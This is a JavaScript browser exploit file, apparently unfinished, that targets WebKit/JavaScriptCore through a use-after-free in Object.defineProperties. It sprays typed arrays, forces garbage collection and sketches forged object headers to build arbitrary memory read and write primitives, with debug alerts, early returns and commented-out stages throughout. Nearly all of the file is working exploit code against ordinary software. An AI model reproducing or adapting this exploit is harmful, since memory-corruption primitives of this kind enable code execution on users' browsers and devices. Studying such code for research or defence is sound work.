// Based on https://jbme.qwertyoruiop.com/
// and lookout PoC code.
var bufs = new Array(1000);



var trycatch = "";
for(var z = 0; z < 0x2000; z++) trycatch += "try{} catch(e){}; ";
var fc = new Function(trycatch);
var fcp = 0;
var smsh = new Uint32Array(0x10)

// Trying to stop GC
function keep(x) {
	setTimeout(function() { alert("shit" + x) }, 10*60*1000);
}
var stale = 0;


var mem0 = 0;
var mem1 = 0;
var mem2 = 0;

function read4(addr) {
	mem0[4] = addr;
	var ret = mem2[0];
	mem0[4] = mem1;
	return ret;
}

function write4(addr, val) {
	mem0[4] = addr;
	mem2[0] = val;
	mem0[4] = mem1;
}

function sleep(milliseconds) {
	var start = new Date().getTime();
	for(var i = 0; i < 1e7; i++) {
		if((new Date().getTime() - start) > milliseconds) {
			break;
		}
	}
}
// This u2d code seems to be taken from a PoC for PSA-2013-0903.
// wraps two uint32s into double precision
_dview = null;

function u2d(low, hi) {
	if(!_dview) _dview = new DataView(new ArrayBuffer(16));
	_dview.setUint32(0, hi);
	_dview.setUint32(4, low);
	return _dview.getFloat64(0);
}
// unwraps uints from double 
function d2u(d) {
	if(!_dview) _dview = new DataView(new ArrayBuffer(16));
	_dview.setFloat64(0, d);
	return {
		low: _dview.getUint32(4),
		hi: _dview.getUint32(0)
	};
}

// dgc attempts to trigger a garbage collection by allocating a large amount of memory
var pressure = new Array(100);
dgc = function() {
	for(var i = 0; i < pressure.length; i++) {
		pressure[i] = new Uint32Array(0x10000);
	}
	for(var i = 0; i < pressure.length; i++) {
		pressure[i] = 0x75757575;
	}
}

// I dont know why hes doing this.
for(var i = 0; i < 0x1000; i++) {
	var a = new Uint32Array(1);
	a[i.toString(16)] = 1337;
}


function allocbufptrs() {
	if(bufs[0]) return;
	dgc();
	/*
	dgc();
	dgc();
	dgc();
	dgc();
	dgc();
	dgc();
	dgc();
	dgc();
	dgc();
	dgc();
	*/
	
	// Create 0x200 FFFF:0000:4141:4141 integer objects
	for(i = 0; i < bufs.length; i++) {
		bufs[i] = new Uint32Array(0x100 * 2)
		for(k = 0; k < bufs[i].length;) {
			bufs[i][k++] = 0x41414141;
			bufs[i][k++] = 0xffff0000;
		}
	}
}

function smashed(stl) {
	alert("Arbitrary code execution here.")
	return 0;
}




function go_() {
	if(smsh.length != 0x10) {
		smashed();
		return;
	}
	dgc();
	var arr = new Array(0x100);
	var yolo = new ArrayBuffer(0x1000);
	arr[0] = yolo;
	arr[1] = 0x13371337;
	var not_number = {};
	not_number.toString = function() {
		arr = null;
		props["stale"]["value"] = null;
		allocbufptrs();
		return 10;
	};
	var props = {
		p0: {value: 0},
		p1: {value: 1},
		p2: {value: 2},
		p3: {value: 3},
		p4: {value: 4},
		p5: {value: 5},
		p6: {value: 6},
		p7: {value: 7},
		p8: {value: 8},
		length: {value: not_number},
		stale: {value: arr},
		after: {value: 666}
	};
	
	var target = [];
	var before_len = arr.length;
	Object.defineProperties(target, props);
	stale = target.stale;
	

	if(before_len != stale.length){
		alert("Exploit Worked v3");
		
		// Keeps arr referenced so that the func doesn't crash upon return.
		// Still crashes on GC.
		keep(arr);
	} else {
		//alert("Exploit Failed");
		document.location.reload();
		return;
	}
	
	//stale[0] += 0x101;
	alert("before gc");
	dgc();
	alert("after gc");
	
	return;

	// Call the function 0x1000 times to force JavascriptCore to mark it as high-usage and JIT it.
	// This will force JS to create a r/w/x block of memory, with raw machine code,
	// this block can then be written to.
	//for (var z = 0; z < 0x1000; z++) fc();
	//alert("After jitted code");

	for(i = 0; i < bufs.length; i++) {
		for(k = 0; k < bufs[0].length; k++) {
			// Check if this is what the stale object points to (0x4141414 + 0x101 == 0x41414242)
			// If this is true then stale[0] points to the same thing as bufs[i][k]
			if(bufs[i][k] == 0x41414242) {
				//var original_val = bufs[i][k];
				//var original_val1 = bufs[i][k+1];
				//alert("Pushed stale");
				//bufs.push(stale);
				//stale[0] = fc;
				//fcp = bufs[i][k];
				dgc();
				dgc();
				dgc();
				dgc();
				alert("GC in loop");
				return;
				
				stale[0] = {
					'a': u2d(105, 0x1172600), // the JSObject properties
					'b': u2d(0, 0), // Butterfly ptr
					'c': smsh, // var smsh = new Uint32Array(0x10)
					'd': u2d(0x100, 0)
				}
			
				/*
				stale[0] = {
				    'a': u2d(structID, 0), // the JSObject properties
				    'b': {1:1, 2:2, 3:3, 4:4, 5:5, 6:6}, //u2d(0, 0), // Butterfly ptr
				    'c': smsh, // var smsh = new Uint32Array(0x10)
				    'd': u2d(0x100, 0)
				}
				stale[0] = {
					// 'a' is the forged JSCell header
					// m_structureID = 105 // Struct ID for Uint32ArrayType (Changes on runtime, how did this work?)
					// m_indexingType = 0x0
					// m_type = 0x26 // Assumingly Uint32ArrayType on the version of webkit this was made on.
					// m_flags = 0x72
					// m_gcData (or m_cellState?) = 0x11
 					'a': u2d(105, 0x1172600),
					
					// 'b' - 'd' are the forged JSArrayBufferView
 					'b': u2d(0, 0),		// butterfly ptr (Does this exist on the version of wk the switch is using?)
 					'c': smsh,		// void* m_vector
 					'd': u2d(0x100, 0)	// uint32_t m_length;
 				}
				*/
				
				stale[1] = stale[0];
				bufs[i][k] += 0x10;
				alert("Stage 2")
			
				return;

				bck = stale[0][4];
				stale[0][4] = 0; // address, low 32 bits
				// stale[0][5] = 1; // address, high 32 bits == 0x100000000
				stale[0][6] = 0xffffffff;
				mem0 = stale[0];
				mem1 = bck;
				mem2 = smsh;
				bufs.push(stale)
				alert("Done doing stuff I don't understand");

				if(smsh.length != 0x10) {
					smashed(stale[0]);
				}

				/*
				sleep(2000);
				alert("busywaited for 5 seconds");
				setTimeout(function(){
					alert("5 seconds up");
					var a = stale[1];
					var b = a;
					alert("b == null: " + b === null);
				}, 5000);
				*/
				return;
			}
		}
	}
	setTimeout(function() {
		document.location.reload();
	}, 500);
}

function go() {
	//alert("ready?");
	dgc();
	dgc();
	dgc();
	dgc();
	dgc();
	dgc();
	setTimeout(go_, 400);
}
go();
